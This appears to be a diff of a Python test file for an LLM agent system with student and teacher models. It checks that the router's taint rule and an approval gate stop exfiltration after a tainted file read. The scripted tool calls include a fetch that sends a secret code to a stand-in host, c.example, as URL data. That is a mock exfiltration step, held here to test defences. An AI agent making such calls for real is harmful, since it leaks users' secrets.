@@ -398,16 +398,29 @@ def test_the_students_read_taints_the_teachers_egress_after_an_escalation() -> N
 
 
 def test_the_teachers_read_taints_the_students_egress_on_the_next_turn() -> None:
+    """The approval gate's own defence, with the router's taint rule off (section 8's router): the same assertions
+    as before that rule existed. With it on, the student never gets turn 2 (the test after this one)."""
     world = TaintedWorld()
     student = [answer(""), call("fetch", {"url": f"https://c.example/?d={CODE}"}, "s2"), answer("Not sent.")]
     teacher = [call("read", {"path": "v.txt"}, "t1"), answer("Read it.")]
     approver = Approver({"fetch": Decision("rejected", reason="no")})
-    agent, router, _s, _t, _ = make(world, student, teacher, approver=approver)
+    agent, router, _s, _t, _ = make(world, student, teacher, approver=approver, route_tainted=False)
     assert agent.run("read v.txt").text == "Read it."  # turn 1: escalated, the teacher reads
     assert agent.run("now fetch it").text == "Not sent."  # turn 2: back with the student
     assert world.fetched == [] and len(approver.notices) == 1
     _taint_and_content(approver.notices[0])
     assert [turn.route for turn in router.take_turns()] == ["teacher", "student"]
+
+
+def test_with_the_taint_rule_the_student_gets_no_turn_after_the_teachers_read() -> None:
+    world = TaintedWorld()
+    student = [answer(""), call("fetch", {"url": f"https://c.example/?d={CODE}"}, "s2")]
+    teacher = [call("read", {"path": "v.txt"}, "t1"), answer("Read it."), answer("Not sent.")]
+    agent, router, s, _t, _ = make(world, student, teacher)
+    assert agent.run("read v.txt").text == "Read it."
+    assert agent.run("now fetch it").text == "Not sent."
+    assert world.fetched == [] and len(s.requests) == 1
+    assert [turn.route for turn in router.take_turns()] == ["teacher", "teacher"]
 
 
 # --- Traces and streaming ---------------------------------------------------------------------------
